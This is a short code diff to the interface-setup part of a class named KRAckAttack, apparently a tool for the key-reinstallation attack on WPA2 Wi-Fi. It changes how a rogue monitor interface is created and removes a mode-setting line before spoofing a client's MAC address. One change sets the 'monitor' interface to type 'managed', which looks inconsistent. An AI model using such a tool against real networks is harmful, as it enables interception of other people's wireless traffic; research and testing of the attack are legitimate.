@@ -827,7 +827,7 @@ class KRAckAttack():
 		subprocess.check_output(["iwconfig", self.nic_real_mon, "mode", "monitor"])
 		if self.nic_rogue_mon is None:
 			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
-			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
+			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "managed"])
 			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 			time.sleep(0.2)
 
@@ -838,7 +838,6 @@ class KRAckAttack():
 		# 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
 		if self.clientmac:
 				subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
-				subprocess.check_output(["iwconfig", self.nic_real_clientack, "mode", "managed"])
 				call_macchanger(self.nic_real_clientack, self.clientmac)
 		else:
 			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
